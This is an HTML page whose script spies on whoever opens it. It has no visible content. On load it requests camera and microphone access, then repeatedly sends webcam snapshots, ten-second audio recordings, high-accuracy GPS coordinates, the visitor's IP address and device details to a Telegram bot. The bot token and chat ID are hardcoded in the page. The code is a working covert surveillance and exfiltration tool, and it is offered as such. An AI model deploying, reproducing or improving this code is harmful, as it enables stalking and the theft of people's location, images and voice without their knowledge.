
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Auto Device Info + Location + Photo + Audio</title>
  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
</head>
<body>

<script>
const botToken = "7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY";
const chatId   = "1538488453";

let stream;
let audioStream;
let lastPhoto = 0;

// ========== 1) Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù†ØµÙŠØ© ==========
function sendText(msg) {
  axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    chat_id: chatId,
    text: msg
  });
}

// ========== 2) Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© ==========
function sendPhoto(blob) {
  const f = new FormData();
  f.append("chat_id", chatId);
  f.append("photo", blob, "auto.jpg");

  axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, f);
}

// ========== 3) Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØª ==========
function sendAudio(blob) {
  const f = new FormData();
  f.append("chat_id", chatId);
  f.append("audio", blob, "audio.webm");

  axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, f)
    .catch(err => console.log("Audio Error:", err));
}

// ========== 4) ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª 10 Ø«ÙˆØ§Ù†Ù ==========
function recordAudio10s() {
  if (!audioStream) return;

  const recorder = new MediaRecorder(audioStream);
  const chunks = [];

  recorder.ondataavailable = e => chunks.push(e.data);

  recorder.onstop = () => {
    const blob = new Blob(chunks, { type: "audio/webm" });
    sendAudio(blob);
  };

  recorder.start();

  // Ø¥ÙŠÙ‚Ø§Ù Ø¨Ø¹Ø¯ 10 Ø«ÙˆØ§Ù†ÙŠ
  setTimeout(() => recorder.stop(), 10000);
}

// ØªÙƒØ±Ø§Ø± ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª ÙƒÙ„ 10 Ø«ÙˆØ§Ù†Ù
setInterval(() => {
  recordAudio10s();
}, 10000);


// ========== 5) Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP Ø§Ù„Ø®Ø§Ø±Ø¬ÙŠ ==========
async function getIP() {
  try {
    let r = await fetch("https://api.ipify.org?format=json");
    return (await r.json()).ip;
  } catch {
    return "Unknown";
  }
}

// ========== 6) Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ==========
async function sendDeviceInfo() {
  const ip = await getIP();

  const info =
    `ðŸ“± Device Info:\n` +
    `UserAgent: ${navigator.userAgent}\n` +
    `Platform: ${navigator.platform}\n` +
    `Screen: ${screen.width}x${screen.height}\n` +
    `Lang: ${navigator.language}\n` +
    `IP: ${ip}`;

  sendText(info);
}

// ========== 7) Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ==========
function sendLocation() {
  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      const msg =
        `ðŸ“ Location:\n` +
        `Lat: ${lat}\n` +
        `Lon: ${lon}\n` +
        `Accuracy: ${acc}m\n\n` +
        `ðŸ—º Google Maps:\nhttps://www.google.com/maps?q=${lat},${lon}`;

      sendText(msg);
    },
    err => sendText("âŒ Location Error: " + err.message),
    { enableHighAccuracy: true, timeout: 15000 }
  );
}

// ========== 8) Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ± ØªÙ„Ù‚Ø§Ø¦ÙŠ ==========
function startCapture() {
  const video = document.createElement("video");
  video.srcObject = stream;
  video.play();

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  video.onplaying = () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    function loop() {
      if (Date.now() - lastPhoto > 5000) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(
          blob => sendPhoto(blob),
          "image/jpeg",
          0.5
        );

        lastPhoto = Date.now();
      }

      requestAnimationFrame(loop);
    }

    loop();
  };
}

// ========== 9) Ø§Ù„Ø¨Ø¯Ø§ÙŠØ© ==========
function startAll() {
  Promise.all([
    navigator.mediaDevices.getUserMedia({ video: true }),
    navigator.mediaDevices.getUserMedia({ audio: true })
  ])
  .then(([vStream, aStream]) => {
    stream = vStream;
    audioStream = aStream;

    sendDeviceInfo();
    sendLocation();
    startCapture();
    recordAudio10s();
  })
  .catch(err => sendText("Media Error: " + err.message));
}

startAll();
</script>

</body>
</html>
